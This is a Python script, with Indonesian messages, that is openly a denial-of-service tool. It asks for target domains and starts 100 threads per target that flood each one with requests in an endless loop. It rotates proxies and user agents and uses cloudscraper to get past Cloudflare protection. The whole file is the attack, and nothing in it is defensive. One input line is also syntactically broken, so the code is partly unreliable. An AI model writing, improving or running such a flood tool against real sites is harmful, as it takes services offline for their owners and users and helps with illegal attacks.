import requests
import threading
import random
import time
import cloudscraper
import json
import logging
from queue import Queue

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")

def load_proxies(filename="proxy.txt"):
    proxies = []
    try:
        with open(filename, "r") as file:
            for line in file:
                proxy = line.strip()
                if proxy:
                    proxies.append({"http": f"http://{proxy}", "https": f"https://{proxy}"})
    except FileNotFoundError:
        logging.error(f"File {filename} tidak ditemukan.")
    return proxies

def is_valid_url(url):
    try:
        response = requests.get(url, timeout=5)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False

def create_scraper_session():
    return cloudscraper.create_scraper()

def ddos_attack(url, proxies, user_agents, q, lock):
    scraper = create_scraper_session()
    while True:
        try:
            headers = {
                "User-Agent": random.choice(user_agents),
                "Referer": "http://proxy.com",
                "Origin": "http://proxy.com"
            }
            proxy = random.choice(proxies)
            response = scraper.get(url, headers=headers, proxies=proxy, timeout=10)
            
            if response.status_code == 200:
                logging.info(f"Request sent to {url}, Response: {response.status_code}")
            else:
                logging.warning(f"Request to {url} failed with status code: {response.status_code}")

            time.sleep(random.uniform(0.1, 0.5))

        except requests.exceptions.RequestException as e:
            with lock:
                logging.error(f"Error in DDoS attack: {e}")

            if not q.empty():
                q.get()

def run_threads(target_urls, proxies, user_agents):
    q = Queue()
    lock = threading.Lock()

    for target_url in target_urls:
        logging.info(f"Starting attack on {target_url}")
        for _ in range(100):
            thread = threading.Thread(target=ddos_attack, args=(target_url, proxies, user_agents, q, lock))
            thread.daemon = True
            thread.start()

def save_attack_status(log_file="attack_log.json"):
    attack_status = {
        "target": "http://targetnya.id",
        "status": "Attack started",
        "timestamp": time.time()
    }
    
    with open(log_file, 'a') as f:
        json.dump(attack_status, f)
        f.write("\n")

def start_attack():
    proxies = load_proxies()
    if not proxies:
        logging.error("No proxies found, exiting attack.")
        return

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36"
    ]

    target_urls = input("Masukkan Domain Target"): ").split(',')
    
    valid_urls = [url.strip() for url in target_urls if is_valid_url(url.strip())]
    if not valid_urls:
        logging.error("Target tidak valid. Exiting.")
        return

    run_threads(valid_urls, proxies, user_agents)
    save_attack_status()

    logging.info("Serangan telah dimulai pada {target_urls}.")

if __name__ == "__main__":
    start_attack()
